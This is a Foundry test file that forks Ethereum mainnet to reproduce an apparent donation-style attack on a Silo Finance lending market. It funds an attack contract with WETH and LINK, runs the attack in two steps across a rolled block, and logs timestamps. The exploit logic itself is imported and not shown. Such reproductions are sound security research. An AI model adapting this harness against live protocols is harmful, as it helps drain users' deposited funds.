pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../src/SiloFinance/BugFixReview.sol";

contract SiloBugFixReviewTest is Test {
    uint256 mainnetFork;

    SiloBugFixReview public siloBugFixReview;

    uint256 constant depositAmount = 1e5;
    uint256 constant donatedAmount = 1e18;

    uint256 otherAccountDepositAmount = 545*1e18;

    function setUp() public {
        mainnetFork = vm.createFork("mainnet", 17139470);
        vm.selectFork(mainnetFork);
        siloBugFixReview = new SiloBugFixReview();
        deal(address(siloBugFixReview.WETH()), address(siloBugFixReview), depositAmount + donatedAmount);
        deal(address(siloBugFixReview.LINK()), address(siloBugFixReview.otherAccount()), otherAccountDepositAmount);
    }

    function testAttack() public {
        address LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;

        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

        console.log("time stamp before = ",block.timestamp);
        console.log("block number before = ",block.number);
        siloBugFixReview.run();
        vm.makePersistent(address(siloBugFixReview));
        vm.makePersistent(address(siloBugFixReview.SILO()));
        
        vm.makePersistent(WETH);
        vm.makePersistent(address(siloBugFixReview.SILO().assetStorage(WETH).collateralToken));
        vm.makePersistent(address(siloBugFixReview.SILO().assetStorage(WETH).collateralOnlyToken));
        vm.makePersistent(address(siloBugFixReview.SILO().assetStorage(WETH).debtToken));

        vm.makePersistent(LINK);
        vm.makePersistent(address(siloBugFixReview.SILO().assetStorage(LINK).collateralToken));
        vm.makePersistent(address(siloBugFixReview.SILO().assetStorage(LINK).collateralOnlyToken));
        vm.makePersistent(address(siloBugFixReview.SILO().assetStorage(LINK).debtToken));

        vm.rollFork(block.number + 1);

        console.log("time stamp after = ",block.timestamp);
        console.log("block number after = ",block.number);
        siloBugFixReview.run2();
    }
}
